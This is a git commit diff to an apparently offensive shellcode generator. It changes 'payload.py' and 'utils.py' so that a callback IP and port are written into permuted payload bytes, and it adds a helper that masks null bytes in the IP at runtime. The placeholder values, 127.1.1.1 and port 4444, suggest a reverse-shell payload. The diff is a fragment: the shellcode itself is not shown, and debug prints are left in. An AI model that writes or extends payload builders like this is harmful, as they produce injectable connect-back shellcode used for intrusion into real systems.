6f2eee0a72eaa535915549ae242b58a78d620619
Brucky <bouncebloc95@gmail.com>
2024-03-07 17:50:39 +0100

    [FEATURE] Mask null bytes at runtime

--- payload.py
+++ payload.py
@@ -23,8 +23,15 @@ class Payload:
         """
         
         """
-        permut_list[18][0] = permut_list[18][0].replace(r"\x11\x5c", convert_port_to_hex(self.port)) # Weird trick for the moment to swap the port (to change)
-        permut_list[17][0] = permut_list[17][0].replace(r"\x7f\x01\x01\x01", ip_to_hex(self.ip)) # Weird trick for the moment to swap the ip (to change)
+        print(permut_list[20][0])
+        print(permut_list[17][0])
+
+        permut_list[20][0] = permut_list[20][0].replace(r"\x11\x5c", convert_port_to_hex(self.port)) # add port
+        permut_list[20][0] += convert_port_to_hex(self.port)
+        permut_list[17][0] += get_ip_and_mask(ip_to_hex(self.ip))[0]
+        permut_list[18][0] += get_ip_and_mask(ip_to_hex(self.ip))[1]
+
+        print(permut_list[17][0])
         
         if self.platform == "Linux":
             for line in permut_list:
--- utils.py
+++ utils.py
@@ -13,3 +13,19 @@ def ip_to_hex(ip_address):
     hex_ip = ''.join([f'\\x{int(octet):02x}' for octet in octets])
     
     return hex_ip
+
+def get_ip_and_mask(hex_ip):
+    bytes = hex_ip.split(r"\x")
+    mask = []
+    ip_edited = []
+
+    for i in range(0,len(bytes)):
+        if bytes[i] == '00':
+            mask.append('04')
+            ip_edited.append('03')
+        else:
+            mask.append(bytes[i])
+            ip_edited.append(bytes[i])
+            
+
+    return ( r"\x".join(ip_edited),r"\x".join(mask))
